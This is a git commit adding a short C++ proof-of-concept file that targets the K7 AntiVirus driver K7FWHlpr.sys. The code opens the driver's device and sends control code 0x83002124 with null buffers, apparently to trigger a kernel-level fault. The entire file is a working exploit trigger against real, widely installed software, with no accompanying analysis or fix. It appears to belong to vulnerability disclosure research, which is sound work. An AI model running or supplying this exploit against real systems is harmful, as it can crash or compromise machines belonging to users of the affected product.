d022aba7ad14130b4104e97e9291c3d85506e328
andy7002 <lpf0606@163.com>
2018-01-28 10:43:47 +0800

    add poc for K7FWHlpr.sys

---
+++ 0x83002124/poc.cpp
@@ -0,0 +1,17 @@
+// K7AntiVirus.cpp : Defines the entry point for the console application.
+//
+
+#include "stdafx.h"
+#include "targetver.h"
+#include <stdio.h>
+#include <tchar.h>
+#include <windows.h>
+
+int _tmain(int argc, _TCHAR* argv[])
+{
+	HANDLE hHandle = 0;
+	DWORD nbBytes = 0;
+	hHandle = CreateFileA("\\\\.\\K7FWHlpr", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
+	DeviceIoControl(hHandle, 0x83002124, (LPVOID)0, 0x0, (LPVOID)0, 0x0, &nbBytes, NULL);
+	return 0;
+}
